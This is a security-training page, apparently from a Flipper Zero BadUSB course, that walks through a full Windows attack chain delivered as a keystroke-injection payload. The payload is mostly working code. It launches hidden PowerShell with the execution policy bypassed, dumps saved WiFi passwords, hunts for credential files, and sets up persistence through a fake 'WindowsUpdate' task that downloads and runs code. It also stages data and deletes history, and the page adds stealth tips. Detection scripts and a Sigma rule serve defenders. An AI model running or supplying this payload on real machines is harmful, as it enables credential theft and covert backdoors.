# FZ-A09: Complete Attack Chain

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-A09 |
| **Name** | Complete Attack Chain |
| **Difficulty** | Advanced |
| **Target OS** | Windows 10/11 |
| **Execution Time** | ~45-60 seconds |
| **Prerequisites** | FZ-A01 through FZ-A08 |
| **MITRE ATT&CK** | Multiple (see mapping below) |

## What This Payload Does

This is a comprehensive payload that demonstrates a complete attack lifecycle:
1. Initial reconnaissance
2. Privilege assessment
3. Data collection (WiFi, system info, credentials locations)
4. Persistence establishment
5. Data staging
6. Exfiltration preparation
7. Anti-forensics cleanup

**Purpose**: Understand how individual techniques combine into a full attack chain. Essential for both red team operations and blue team detection strategy development.

---

## MITRE ATT&CK Mapping

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    MITRE ATT&CK MAPPING - FZ-A09                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  PHASE              TECHNIQUE                         ID                     │
│  ─────              ─────────                         ──                     │
│  Initial Access     Hardware Additions                T1200                  │
│  Execution          PowerShell                        T1059.001              │
│  Execution          Windows Command Shell             T1059.003              │
│  Persistence        Scheduled Task/Job                T1053.005              │
│  Persistence        Registry Run Keys                 T1547.001              │
│  Discovery          System Information Discovery      T1082                  │
│  Discovery          System Network Configuration      T1016                  │
│  Discovery          Account Discovery                 T1087                  │
│  Discovery          Process Discovery                 T1057                  │
│  Credential Access  Credentials from Password Stores  T1555                  │
│  Collection         Data Staged                       T1074                  │
│  Exfiltration       Exfiltration Over C2 Channel      T1041                  │
│  Defense Evasion    Indicator Removal                 T1070                  │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## The Payload

```ducky
REM ################################################################
REM # Payload: FZ-A09 - Complete Attack Chain
REM # Target:  Windows 10/11 (User or Admin)
REM # Author:  Security Training Repository
REM # Version: 2.0
REM #
REM # WARNING: FOR AUTHORIZED TESTING ONLY
REM # This payload demonstrates a complete attack lifecycle.
REM # Use only in lab environments or with written authorization.
REM #
REM # Phases:
REM # 1. Reconnaissance - Gather system information
REM # 2. Collection - Extract sensitive data
REM # 3. Persistence - Establish backdoor
REM # 4. Staging - Prepare data for exfil
REM # 5. Cleanup - Remove forensic artifacts
REM ################################################################

REM === CONFIGURATION ===
REM Modify these values for your engagement
REM DEFAULT_DELAY adds delay between every line for reliability
DEFAULT_DELAY 50

REM === PHASE 0: INITIAL ACCESS ===
REM Wait for USB enumeration
DELAY 3000

REM === PHASE 1: STEALTH SETUP ===
REM Open PowerShell minimized to avoid detection
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1500

REM === PHASE 2: RECONNAISSANCE ===
REM Create working directory
STRINGLN $d="$env:TEMP\sys";New-Item -ItemType Directory -Force -Path $d|Out-Null

REM Gather system information
STRINGLN $h="$d\host.txt";Get-ComputerInfo|Out-File $h

REM Get network configuration
STRINGLN Get-NetIPConfiguration|Out-File "$d\network.txt"

REM Get running processes
STRINGLN Get-Process|Select Name,Id,Path|Out-File "$d\processes.txt"

REM Get installed software
STRINGLN Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*|Select DisplayName,Version|Out-File "$d\software.txt"

REM Get local users
STRINGLN Get-LocalUser|Out-File "$d\users.txt"

REM Get scheduled tasks
STRINGLN Get-ScheduledTask|Where State -eq "Ready"|Select TaskName,TaskPath|Out-File "$d\tasks.txt"

REM === PHASE 3: CREDENTIAL HUNTING ===
REM Extract WiFi passwords (if admin or stored)
STRINGLN (netsh wlan show profiles)|Select-String "All User Profile"|ForEach{$p=($_ -split ":")[-1].Trim();netsh wlan show profile name="$p" key=clear}|Out-File "$d\wifi.txt"

REM Find potential credential files
STRINGLN Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.kdbx,*.key,*password*,*credential*,*.rdp -ErrorAction SilentlyContinue|Select FullName|Out-File "$d\credfiles.txt"

REM Browser data locations (not extracting, just locating)
STRINGLN $browsers=@{Chrome="$env:LOCALAPPDATA\Google\Chrome\User Data";Firefox="$env:APPDATA\Mozilla\Firefox\Profiles";Edge="$env:LOCALAPPDATA\Microsoft\Edge\User Data"};$browsers.GetEnumerator()|ForEach{if(Test-Path $_.Value){"$($_.Key): $($_.Value)"}}|Out-File "$d\browsers.txt"

REM === PHASE 4: PERSISTENCE ===
REM Check if we have admin rights
STRINGLN $isAdmin=[Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

REM Establish persistence based on privilege level
STRINGLN if($isAdmin){schtasks /create /tn "WindowsUpdate" /tr "powershell -w hidden -ep bypass -c 'IEX(New-Object Net.WebClient).DownloadString(''http://localhost/update'')'" /sc daily /st 09:00 /f}else{$r="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run";Set-ItemProperty -Path $r -Name "WindowsUpdate" -Value "powershell -w hidden -ep bypass -c 'Start-Sleep 30'"}

REM === PHASE 5: DATA STAGING ===
REM Compress all collected data
STRINGLN Compress-Archive -Path "$d\*" -DestinationPath "$d\data.zip" -Force

REM Encode for exfiltration
STRINGLN $bytes=[IO.File]::ReadAllBytes("$d\data.zip");$enc=[Convert]::ToBase64String($bytes);$enc|Out-File "$d\staged.b64"

REM === PHASE 6: EXFILTRATION PREP ===
REM In real scenario, this would send data to C2
REM For training, we just show where data is staged
STRINGLN Write-Output "Data staged at: $d\staged.b64"|Out-File "$d\status.txt"

REM === PHASE 7: CLEANUP (PARTIAL) ===
REM Remove PowerShell history
STRINGLN Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

REM Clear recent run commands
STRINGLN Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name * -ErrorAction SilentlyContinue

REM Note: Leaving artifacts for training purposes
REM Real cleanup would remove $d directory

REM Exit PowerShell
STRINGLN exit
```

---

## Phase-by-Phase Breakdown

### Phase 0: Initial Access (USB Enumeration)

```ducky
DELAY 3000
```

**What happens**:
- Flipper Zero connects as USB HID keyboard
- Windows detects and loads generic keyboard driver
- 3-second delay ensures stable connection

**MITRE ATT&CK**: T1200 (Hardware Additions)

**Detection opportunity**:
- USB device connection logged (Event ID 20001)
- New HID device appears in Device Manager

---

### Phase 1: Stealth Setup

```ducky
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
```

**What happens**:
- Opens Run dialog
- Launches PowerShell with:
  - `-w hidden`: Window minimized/hidden
  - `-ep bypass`: ExecutionPolicy bypassed

**Why these flags**:
```
┌─────────────────────────────────────────────────────────────────────────────┐
│                     POWERSHELL STEALTH FLAGS                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  -w hidden (-WindowStyle Hidden)                                             │
│  ─────────────────────────────────                                           │
│  • Prevents PowerShell window from appearing                                 │
│  • User doesn't see blue console window                                      │
│  • Process still visible in Task Manager                                     │
│                                                                              │
│  -ep bypass (-ExecutionPolicy Bypass)                                        │
│  ──────────────────────────────────────                                      │
│  • Ignores system execution policy                                           │
│  • Allows running scripts without signing                                    │
│  • Only affects THIS PowerShell instance                                     │
│  • System policy unchanged                                                   │
│                                                                              │
│  Additional stealth options (not used here):                                 │
│  -nop (-NoProfile): Skip profile scripts                                     │
│  -noni (-NonInteractive): No prompts                                         │
│  -enc (-EncodedCommand): Base64 encoded command                              │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

**Detection opportunity**:
- Process creation with suspicious arguments
- PowerShell logging (Event ID 4104)

---

### Phase 2: Reconnaissance

```ducky
STRINGLN $d="$env:TEMP\sys";New-Item -ItemType Directory -Force -Path $d|Out-Null
STRINGLN $h="$d\host.txt";Get-ComputerInfo|Out-File $h
STRINGLN Get-NetIPConfiguration|Out-File "$d\network.txt"
...
```

**What happens**:
Creates a directory and gathers:
- Computer information (OS, hardware)
- Network configuration (IP, DNS, gateway)
- Running processes
- Installed software
- Local user accounts
- Scheduled tasks

**Why this matters**:
```
┌─────────────────────────────────────────────────────────────────────────────┐
│                     RECONNAISSANCE VALUE                                     │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  INFORMATION           VALUE TO ATTACKER                                     │
│  ───────────           ─────────────────                                     │
│  ComputerInfo          OS version → exploit selection                        │
│                        Domain status → lateral movement potential            │
│                        Hardware → resource capabilities                      │
│                                                                              │
│  Network Config        Internal IP → network mapping                         │
│                        DNS server → potential pivot point                    │
│                        Gateway → network topology                            │
│                                                                              │
│  Processes             Security software → evasion planning                  │
│                        Running services → attack surface                     │
│                        User activity → timing operations                     │
│                                                                              │
│  Software              Vulnerable apps → exploitation                        │
│                        Security tools → bypass requirements                  │
│                        Business apps → data targeting                        │
│                                                                              │
│  Users                 Admin accounts → privilege targets                    │
│                        User habits → social engineering                      │
│                        Service accounts → persistence options                │
│                                                                              │
│  Scheduled Tasks       Existing tasks → hijacking opportunities              │
│                        Timing patterns → operational planning                │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

**Detection opportunity**:
- Multiple system enumeration commands in sequence
- New directory creation in TEMP
- File writes to unusual location

---

### Phase 3: Credential Hunting

```ducky
STRINGLN (netsh wlan show profiles)|Select-String "All User Profile"|ForEach{$p=($_ -split ":")[-1].Trim();netsh wlan show profile name="$p" key=clear}|Out-File "$d\wifi.txt"
```

**What happens**:
1. Lists all saved WiFi profiles
2. For each profile, extracts stored password
3. Saves to file

**Command breakdown**:
```powershell
# Step 1: Get all profile names
netsh wlan show profiles
# Output: "All User Profile     : MyWiFi"

# Step 2: Extract just the name
Select-String "All User Profile" |
ForEach { ($_ -split ":")[-1].Trim() }
# Output: "MyWiFi"

# Step 3: Get password for that profile
netsh wlan show profile name="MyWiFi" key=clear
# Output: Key Content : MyPassword123
```

**Additional credential hunting**:
```ducky
STRINGLN Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.kdbx,*.key,*password*,*credential*,*.rdp -ErrorAction SilentlyContinue|Select FullName|Out-File "$d\credfiles.txt"
```

Searches for:
- `.kdbx` - KeePass databases
- `.key` - Key files
- `*password*` - Files with "password" in name
- `*credential*` - Credential files
- `.rdp` - Remote Desktop files (may contain saved credentials)

---

### Phase 4: Persistence

```ducky
STRINGLN if($isAdmin){schtasks /create /tn "WindowsUpdate" /tr "powershell -w hidden -ep bypass -c 'IEX(New-Object Net.WebClient).DownloadString(''http://localhost/update'')'" /sc daily /st 09:00 /f}else{$r="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run";Set-ItemProperty -Path $r -Name "WindowsUpdate" -Value "powershell -w hidden -ep bypass -c 'Start-Sleep 30'"}
```

**What happens** (Admin path):
- Creates scheduled task named "WindowsUpdate"
- Task runs daily at 9 AM
- Downloads and executes remote payload
- `/f` forces overwrite if exists

**What happens** (User path):
- Adds registry Run key
- Executes at user login
- Named "WindowsUpdate" to blend in

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                     PERSISTENCE COMPARISON                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│                    SCHEDULED TASK              REGISTRY RUN KEY             │
│  ────────────────  ──────────────              ────────────────             │
│  Privilege Req:    Administrator               User                         │
│  Trigger:          Time-based                  Login-based                  │
│  Visibility:       Task Scheduler              Registry/Autoruns            │
│  Reliability:      High                        Medium                       │
│  Stealth:          Medium (common location)    Low (well-known)             │
│  Survives:         User logout                 Only current user            │
│  MITRE ATT&CK:     T1053.005                   T1547.001                    │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

### Phase 5: Data Staging

```ducky
STRINGLN Compress-Archive -Path "$d\*" -DestinationPath "$d\data.zip" -Force
STRINGLN $bytes=[IO.File]::ReadAllBytes("$d\data.zip");$enc=[Convert]::ToBase64String($bytes);$enc|Out-File "$d\staged.b64"
```

**What happens**:
1. Compresses all collected files into ZIP
2. Reads ZIP as bytes
3. Converts to Base64 string
4. Saves for exfiltration

**Why Base64**:
- Can be transmitted over text-based channels
- Bypasses some content filtering
- Easier to embed in HTTP requests
- Works with DNS exfiltration

---

### Phase 6: Exfiltration Preparation

```ducky
STRINGLN Write-Output "Data staged at: $d\staged.b64"|Out-File "$d\status.txt"
```

**What would happen in real attack**:
- HTTP POST to C2 server
- DNS exfiltration
- Cloud storage upload
- Email to attacker

**Exfiltration methods comparison**:
```
┌─────────────────────────────────────────────────────────────────────────────┐
│                     EXFILTRATION METHODS                                     │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  METHOD          BANDWIDTH    STEALTH      DETECTION                        │
│  ──────          ─────────    ───────      ─────────                        │
│  HTTP/S          High         Medium       DLP, Proxy                       │
│  DNS             Low          High         DNS logging, anomaly             │
│  ICMP            Low          High         Deep packet inspection           │
│  Cloud Services  High         Medium       Cloud access logs                │
│  Email           Medium       Low          Email gateway                    │
│  USB             N/A          High         Endpoint monitoring              │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

### Phase 7: Anti-Forensics

```ducky
STRINGLN Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
STRINGLN Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name * -ErrorAction SilentlyContinue
```

**What happens**:
1. Deletes PowerShell command history
2. Clears Run dialog history (MRU = Most Recently Used)

**What else attackers might clean**:
- Event logs (requires admin)
- Prefetch files
- Recent files lists
- Browser history
- Thumbnail cache

---

## Red Team Perspective

### Execution Timing

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                     ATTACK CHAIN TIMELINE                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  0s          5s          15s         30s         45s         60s            │
│  │           │           │           │           │           │              │
│  ▼           ▼           ▼           ▼           ▼           ▼              │
│  ┌───────────┬───────────┬───────────┬───────────┬───────────┐              │
│  │   USB     │   RECON   │ CREDENTIAL│PERSISTENCE│  CLEANUP  │              │
│  │   ENUM    │           │  HUNTING  │           │           │              │
│  └───────────┴───────────┴───────────┴───────────┴───────────┘              │
│                                                                              │
│  Physical access needed: ~60 seconds                                         │
│  Unattended system recommended                                               │
│  Evidence window: Until next login/reboot                                    │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Operational Considerations

| Factor | Consideration |
|--------|---------------|
| Time needed | ~60 seconds unattended |
| Visibility | Minimal (hidden window) |
| Noise level | Medium (lots of commands) |
| Persistence | Survives reboot |
| Data access | User-level by default |
| Network needed | For exfiltration only |

### Making It Stealthier

1. **Break into stages**: Don't run everything at once
2. **Add jitter**: Random delays between commands
3. **Legitimate names**: Use common Windows process names
4. **Encrypt in memory**: Don't write plaintext to disk
5. **Living off the land**: Use only built-in tools

---

## Blue Team Perspective

### Detection Opportunities by Phase

| Phase | Detection Method | Indicator |
|-------|------------------|-----------|
| Initial Access | USB monitoring | New HID device |
| Stealth Setup | Process monitoring | powershell -w hidden |
| Recon | Command logging | Enumeration cmdlets |
| Credential Hunting | File access monitoring | Access to credential stores |
| Persistence | Scheduled task monitoring | New task creation |
| Staging | File monitoring | ZIP creation in TEMP |
| Cleanup | Log monitoring | History deletion attempts |

### Detection Script (PowerShell)

```powershell
#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Detect indicators of FZ-A09 style attack chains
.DESCRIPTION
    Monitors for behavioral patterns indicative of BadUSB attack chains
#>

# Check for recent suspicious PowerShell activity
$recentPS = Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-PowerShell/Operational'
    StartTime=(Get-Date).AddHours(-1)
} -ErrorAction SilentlyContinue | Where-Object {
    $_.Message -match '-w.*hidden|bypass|DownloadString|IEX'
}

if ($recentPS) {
    Write-Warning "ALERT: Suspicious PowerShell activity detected!"
    $recentPS | Format-List TimeCreated, Message
}

# Check for new scheduled tasks in last hour
$recentTasks = Get-ScheduledTask | Where-Object {
    $_.Date -gt (Get-Date).AddHours(-1) -and
    $_.Actions.Execute -match 'powershell|cmd'
}

if ($recentTasks) {
    Write-Warning "ALERT: Recently created suspicious scheduled task!"
    $recentTasks | Format-List TaskName, TaskPath, Actions
}

# Check for suspicious registry Run keys
$runKeys = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
)

foreach ($key in $runKeys) {
    $items = Get-ItemProperty -Path $key -ErrorAction SilentlyContinue
    $items.PSObject.Properties | Where-Object {
        $_.Value -match 'powershell.*hidden|bypass|DownloadString'
    } | ForEach-Object {
        Write-Warning "ALERT: Suspicious Run key: $($_.Name)"
    }
}

# Check for unusual files in TEMP
$suspiciousFiles = Get-ChildItem -Path $env:TEMP -Recurse -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -match '\.b64$|staged|data\.zip' }

if ($suspiciousFiles) {
    Write-Warning "ALERT: Suspicious staged files in TEMP!"
    $suspiciousFiles | Format-List FullName, CreationTime, Length
}

# Check for recent USB HID device connections
$usbEvents = Get-WinEvent -FilterHashtable @{
    LogName='System'
    ProviderName='Microsoft-Windows-Kernel-PnP'
    StartTime=(Get-Date).AddHours(-1)
} -ErrorAction SilentlyContinue | Where-Object {
    $_.Message -match 'HID'
}

if ($usbEvents) {
    Write-Host "Recent USB HID devices:" -ForegroundColor Yellow
    $usbEvents | Select-Object TimeCreated, Message | Format-Table -Wrap
}
```

### Sigma Rule

```yaml
title: BadUSB Attack Chain Detection
id: a1234567-89ab-cdef-0123-456789abcdef
status: experimental
description: Detects behavioral patterns consistent with BadUSB attack chains
author: Security Training Repository
date: 2025/01/01
references:
    - https://attack.mitre.org/techniques/T1200/
logsource:
    product: windows
    category: process_creation
detection:
    selection_hidden:
        CommandLine|contains|all:
            - 'powershell'
            - '-w'
            - 'hidden'
    selection_recon:
        CommandLine|contains:
            - 'Get-ComputerInfo'
            - 'Get-NetIPConfiguration'
            - 'Get-LocalUser'
    selection_wifi:
        CommandLine|contains:
            - 'netsh wlan show'
            - 'key=clear'
    selection_persistence:
        CommandLine|contains:
            - 'schtasks /create'
            - 'CurrentVersion\Run'
    timeframe: 5m
    condition: selection_hidden and (selection_recon or selection_wifi or selection_persistence)
falsepositives:
    - Administrative scripts
    - System management tools
level: high
tags:
    - attack.initial_access
    - attack.t1200
    - attack.execution
    - attack.t1059.001
```

### Prevention Checklist

- [ ] USB device whitelisting enabled
- [ ] PowerShell script block logging enabled
- [ ] Command line auditing enabled (Event ID 4688)
- [ ] Scheduled task creation monitoring
- [ ] Registry Run key monitoring
- [ ] TEMP directory monitoring
- [ ] Network egress filtering
- [ ] EDR with behavioral analysis

---

## Practice Exercises

### Exercise 1: Analyze the Flow
Draw a diagram showing:
1. Each phase of the attack
2. Files created at each phase
3. Detection opportunities at each phase

### Exercise 2: Detection Rule
Write a detection rule (Sigma, Splunk, or KQL) that detects:
1. Hidden PowerShell windows
2. WiFi password extraction attempts
3. Both occurring within 5 minutes

### Exercise 3: Modify for Stealth
How would you modify this payload to:
1. Reduce detection opportunities
2. Not create files on disk
3. Use different persistence mechanism

### Exercise 4: Blue Team Response
You detected this attack in progress. Document:
1. Immediate containment steps
2. Evidence collection priorities
3. Eradication actions
4. Recovery steps

---

## Payload File

Save as `FZ-A09_Complete_Attack_Chain.txt`:

```ducky
REM FZ-A09: Complete Attack Chain
REM FOR AUTHORIZED TESTING ONLY
DEFAULT_DELAY 50
DELAY 3000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1500
STRINGLN $d="$env:TEMP\sys";New-Item -ItemType Directory -Force -Path $d|Out-Null
STRINGLN Get-ComputerInfo|Out-File "$d\host.txt"
STRINGLN Get-NetIPConfiguration|Out-File "$d\network.txt"
STRINGLN Get-Process|Select Name,Id,Path|Out-File "$d\processes.txt"
STRINGLN (netsh wlan show profiles)|Select-String "All User Profile"|ForEach{$p=($_ -split ":")[-1].Trim();netsh wlan show profile name="$p" key=clear}|Out-File "$d\wifi.txt"
STRINGLN $isAdmin=[Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
STRINGLN if(-not $isAdmin){$r="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run";Set-ItemProperty -Path $r -Name "WinUpdate" -Value "calc.exe"}
STRINGLN Compress-Archive -Path "$d\*" -DestinationPath "$d\data.zip" -Force
STRINGLN Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
STRINGLN exit
```

---

## Summary

**What you learned**:
- Complete attack chain methodology
- How individual techniques combine
- MITRE ATT&CK framework application
- Multi-phase detection strategies
- Forensic artifact creation and cleanup

**Prerequisites completed**:
- [x] FZ-A01: Multi-Stage Recon
- [x] FZ-A02: Reverse Shell (concept)
- [x] FZ-A03: AMSI Bypass
- [x] FZ-A08: Network Share Enumeration

**Next**: [FZ-A10: Anti-Forensics](FZ-A10_Anti_Forensics.md)

---

[← Back to Advanced Scripts](README.md) | [Next: FZ-A10 Anti-Forensics →](FZ-A10_Anti_Forensics.md)
